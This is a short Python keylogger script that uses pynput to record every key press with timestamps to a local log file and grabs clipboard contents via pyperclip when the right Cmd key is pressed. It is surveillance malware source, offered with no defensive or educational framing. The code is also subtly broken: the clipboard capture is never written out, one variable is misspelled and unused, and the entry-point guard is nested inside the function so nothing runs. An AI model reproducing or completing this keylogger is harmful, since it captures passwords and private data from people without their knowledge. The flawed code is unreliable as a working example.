import pyperclip

from datetime import datetime
from pynput.keyboard import Listener


KEYSTOKE_LOG_FILE = './logs/keystroke.log'

def log_key_press(key):
    # Process the key press, get contents from keyboard
    key = str(key).replace("'" , "")
    Line_to_write = None
    now = datetime.now()
    
    if key == 'key.cmd_r':
        line_to_write = f"{now}: Clipboard - {pyperclip.paste()}"
    else:
        line_to_write = f"{now}: Key Press - {key}"
        
        # Write the output to the file
        with open(KEYSTOKE_LOG_FILE, 'a') as f:
            f.write(f"{line_to_write}\n")
        
    
def start():
    # Figure out how to track key process
    with Listener(on_press=log_key_press) as l:
        l.join ()
    
    if __name__ == '__main__':
        start()